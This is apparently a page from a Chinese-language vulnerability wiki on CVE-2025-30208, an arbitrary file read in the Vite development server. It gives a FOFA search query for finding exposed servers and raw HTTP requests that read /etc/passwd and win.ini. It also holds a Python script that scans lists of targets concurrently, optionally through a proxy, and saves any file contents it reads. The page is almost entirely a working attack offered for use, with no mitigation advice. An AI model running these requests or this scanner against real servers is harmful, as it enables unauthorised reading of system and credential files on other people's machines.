<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%28CVE-2025-30208%29/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Vite开发服务器任意文件读取漏洞(CVE 2025 30208) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Vite\u5f00\u53d1\u670d\u52a1\u5668\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e(CVE-2025-30208)", url: "#_top", children: [
          ]},
          {title: "fofa", url: "#fofa", children: [
          ]},
          {title: "POC-(Linux)", url: "#poc-linux", children: [
          ]},
          {title: "poc-(windows)", url: "#poc-windows", children: [
          ]},
          {title: "python\u811a\u672c", url: "#python", children: [
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Vmware%20vCenter/CVE-2021-21972%20vCenter%206.5-7.0%20RCE%20%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8BPOC/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Vmware%20vCenter/CVE-2021-21972%20vCenter%206.5-7.0%20RCE%20%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8BPOC/" class="btn btn-xs btn-link">
        CVE-2021-21972 vCenter 6.5-7.0 RCE 漏洞检测POC
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Viessmann/ViessmannVitogateRCE%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-45852%EF%BC%89/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Viessmann/ViessmannVitogateRCE%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-45852%EF%BC%89/" class="btn btn-xs btn-link">
        Viessmann Vitogate RCE 漏洞（CVE-2023-45852）
      </a>
    </div>
    
  </div>

    

    <h2 id="vitecve-2025-30208">Vite开发服务器任意文件读取漏洞(CVE-2025-30208)<a class="headerlink" href="#vitecve-2025-30208" title="Permanent link">&para;</a></h2>
<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>body=&quot;/@vite/client&quot;
</code></pre></div>
<h2 id="poc-linux">POC-(Linux)<a class="headerlink" href="#poc-linux" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>GET /@fs/etc/passwd?import&amp;raw?? HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
</code></pre></div>
<h2 id="poc-windows">poc-(windows)<a class="headerlink" href="#poc-windows" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>GET /@fs/C://Windows/win.ini?import&amp;raw?? HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
</code></pre></div>
<h2 id="python">python脚本<a class="headerlink" href="#python" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>import requests
import argparse
import urllib3
import concurrent.futures
import re
import time
from urllib.parse import urljoin
from colorama import Fore, Style, init

# 初始化 colorama（使其在 Windows 中也能支持颜色）
init(autoreset=True)

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 最大重试次数
RETRY_LIMIT = 3

def sanitize_filename(url):
    &quot;&quot;&quot; 清理 URL 作为文件名，防止非法字符 &quot;&quot;&quot;
    safe_name = re.sub(r&#39;[^\w\-]&#39;, &#39;_&#39;, url)  # 替换非法字符
    safe_name = re.sub(r&#39;_+&#39;, &#39;_&#39;, safe_name)  # 去重 `_`
    safe_name = safe_name.strip(&#39;_&#39;)  # 移除开头/结尾的 `_`
    return safe_name

def fetch_url(url, proxy, retries=0):
    &quot;&quot;&quot; 访问 URL，支持重试 &quot;&quot;&quot;
    proxies = {&quot;http&quot;: proxy, &quot;https&quot;: proxy} if proxy else None
    try:
        response = requests.get(url, timeout=5, verify=False, proxies=proxies, allow_redirects=False)
        if response.status_code == 200:
            return response.text
        else:
            print(f&quot;[FAIL] {url} returned {response.status_code}&quot;)
            return None
    except requests.exceptions.ConnectionError:
        if retries &lt; RETRY_LIMIT:
            wait_time = 2 ** retries  # 指数退避
            print(f&quot;[ERROR] connect error to {url} - Retrying...&quot;)
            time.sleep(wait_time)
            return fetch_url(url, proxy, retries + 1)
        else:
            print(f&quot;[ERROR] connect error to {url} after {RETRY_LIMIT} retries&quot;)
            return None
    except requests.exceptions.RequestException:
        if retries &lt; RETRY_LIMIT:
            wait_time = 2 ** retries  # 指数退避
            print(f&quot;[ERROR] connect error to {url} - Retrying...&quot;)
            time.sleep(wait_time)
            return fetch_url(url, proxy, retries + 1)
        else:
            print(f&quot;[ERROR] connect error to {url} after {RETRY_LIMIT} retries&quot;)
            return None

def check_url(base_url, paths, proxy, output_file):
    &quot;&quot;&quot; 遍历多个路径，拼接 URL 并检查是否能访问 &quot;&quot;&quot;
    results = []
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = {}
        for path in paths:
            url = urljoin(base_url, path)
            if &quot;?raw&quot; not in url:
                url += &quot;?raw&quot;

            futures[executor.submit(fetch_url, url, proxy)] = url  # 为每个路径提交并发请求

        for future in concurrent.futures.as_completed(futures):
            url = futures[future]
            content = future.result()
            if content:
                if &quot;/etc/passwd&quot; in url:  # 如果是 /etc/passwd 路径，仅显示 SUCCESS
                    print(f&quot;[{Fore.RED}SUCCESS{Style.RESET_ALL}] {url}&quot;)
                elif &quot;/root:/bin/bash&quot; in content:  # 如果包含 /root:/bin/bash，成功并保存到文件
                    result = f&quot;[{Fore.RED}SUCCESS{Style.RESET_ALL}] {url}&quot;
                    print(result)
                    # 输出到 output.txt 文件（追加模式）
                    output_file.write(result + &quot;\n&quot;)
                    output_file.write(content + &quot;\n&quot;)
                    results.append(result)
                else:
                    print(f&quot;[FAIL] {url} does not contain expected content&quot;)
    return results

def check_urls_from_file(file_path, paths, proxy):
    &quot;&quot;&quot; 读取 URL 文件，并使用线程池并发检查 &quot;&quot;&quot;
    with open(file_path, &#39;r&#39;) as file:
        links = [line.strip() for line in file.readlines()]

    print(f&quot;[INFO] Processing {len(links)} base URLs with concurrent requests.&quot;)

    # 打开 output.txt 文件（以追加模式）
    with open(&quot;output.txt&quot;, &quot;a&quot;) as output_file:
        results = []
        with concurrent.futures.ThreadPoolExecutor() as executor:
            futures = {executor.submit(check_url, link, paths, proxy, output_file): link for link in links}
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    results.extend(result)

def check_urls_from_dict(paths, proxy):
    &quot;&quot;&quot; 仅使用 -d 参数时，直接检查路径字典 &quot;&quot;&quot;
    print(f&quot;[INFO] Processing {len(paths)} paths concurrently.&quot;)

    results = []
    with open(&quot;output.txt&quot;, &quot;a&quot;) as output_file:  # 以追加模式打开 output.txt
        with concurrent.futures.ThreadPoolExecutor() as executor:
            futures = {}
            for path in paths:
                futures[executor.submit(fetch_url, path, proxy)] = path

            for future in concurrent.futures.as_completed(futures):
                path = futures[future]
                content = future.result()
                if content:
                    if &quot;/etc/passwd&quot; in path:  # 如果是 /etc/passwd 路径，仅显示 SUCCESS
                        print(f&quot;[{Fore.RED}SUCCESS{Style.RESET_ALL}] {path}&quot;)
                    elif &quot;/root:/bin/bash&quot; in content:  # 如果包含 /root:/bin/bash，成功并保存到文件
                        result = f&quot;[{Fore.RED}SUCCESS{Style.RESET_ALL}] {path}&quot;
                        print(result)
                        # 输出到 output.txt 文件（追加模式）
                        output_file.write(result + &quot;\n&quot;)
                        output_file.write(content + &quot;\n&quot;)
                        results.append(result)
                    else:
                        print(f&quot;[FAIL] {path} does not contain expected content&quot;)
    return results

if __name__ == &quot;__main__&quot;:
    parser = argparse.ArgumentParser(description=&quot;Batch check access to multiple paths on multiple links&quot;)
    parser.add_argument(&quot;-f&quot;, &quot;--file&quot;, help=&quot;File containing base links&quot;)
    parser.add_argument(&quot;-u&quot;, &quot;--url&quot;, help=&quot;Target URL&quot;)
    parser.add_argument(&quot;-p&quot;, &quot;--payload&quot;, default=&#39;/etc/passwd&#39;, help=&quot;Target file path&quot;)
    parser.add_argument(&quot;-d&quot;, &quot;--dict&quot;, help=&quot;File containing list of paths to append to base URL&quot;)
    parser.add_argument(&quot;--proxy&quot;, help=&quot;Proxy server (e.g., http://proxy:port)&quot;)
    args = parser.parse_args()

    paths = []
    if args.dict:
        with open(args.dict, &#39;r&#39;) as dict_file:
            paths = [line.strip() for line in dict_file.readlines()]
    else:
        paths.append(args.payload)

    # 处理单个 URL
    if args.url:
        check_url(args.url, paths, args.proxy, None)
    # 处理多个 URL
    elif args.file:
        check_urls_from_file(args.file, paths, args.proxy)
    # 处理 -d 参数，单独加速路径检查
    elif args.dict:
        check_urls_from_dict(paths, args.proxy)
    else:
        print(&quot;Usage: python3 script.py -h&quot;)
</code></pre></div>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Vmware%20vCenter/CVE-2021-21972%20vCenter%206.5-7.0%20RCE%20%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8BPOC/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Vmware%20vCenter/CVE-2021-21972%20vCenter%206.5-7.0%20RCE%20%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8BPOC/" class="btn btn-xs btn-link">
        CVE-2021-21972 vCenter 6.5-7.0 RCE 漏洞检测POC
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Viessmann/ViessmannVitogateRCE%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-45852%EF%BC%89/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Viessmann/ViessmannVitogateRCE%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-45852%EF%BC%89/" class="btn btn-xs btn-link">
        Viessmann Vitogate RCE 漏洞（CVE-2023-45852）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>